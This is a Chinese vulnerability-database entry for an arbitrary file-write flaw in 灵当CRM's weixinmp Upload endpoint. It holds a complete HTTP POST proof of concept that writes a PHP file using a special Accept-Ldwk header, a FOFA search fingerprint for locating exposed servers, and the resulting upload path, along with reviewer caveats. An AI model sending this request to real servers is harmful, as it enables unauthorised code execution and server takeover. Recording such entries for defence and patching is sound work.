---
source: "wy876 漏洞文库"
title: "灵当CRM weixinmp Upload uploadfile写PHP"
product: "灵当CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "userid123/usid1及版本未知"
prerequisites: "Accept-Ldwk特制头语义未述"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/oaxy831ru4asisru"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93crmuploadfile%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "body="
id: "vw-5a4e2a7c354d48a87d314bd3"
entity_id: "ve-5a4e2a7c354d48a87d314bd3"
schema_version: "1"
---

# 灵当CRM weixinmp Upload uploadfile写PHP

## 条目说明

- 对象与具体问题：灵当CRM；weixinmp Upload uploadfile写PHP
- 版本、配置及部署条件：userid123/usid1及版本未知
- 认证与权限前提：Accept-Ldwk特制头语义未述
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- form-urlencoded正文file_info后直接&PHP代码，不是正常具名字段，需解释原始流写入机制与解析条件
- MD5输出并自删不保证无副作用，上传路径日期化需从响应获取
- FOFA Markdown污染与其他灵当篇共享；仅正文无响应/修复
- 不要把伪造userid/usid默认视为有效授权

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
灵当CRM 是一款企业级客户关系管理软件。它旨在帮助企业管理客户信息、销售流程、市场营销活动和客户服务等。灵当crm存在任意文件写入漏洞，攻击者可以通过该漏洞写入恶意文件获取服务器权限。

## 二、影响版本
+ 灵当crm

## 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征


## 四、漏洞复现
```http
POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

file_info={"name":"1.php"}&<?php echo(md5(233));unlink(__FILE__);?>
```

> 请求长度说明：原资料 Content-Length 为 67；保留原始标头；其数值未据实际请求体重新计算或验证。


```plain
/crm/storage/2024/August/week1/172299960228103.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/oaxy831ru4asisru>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
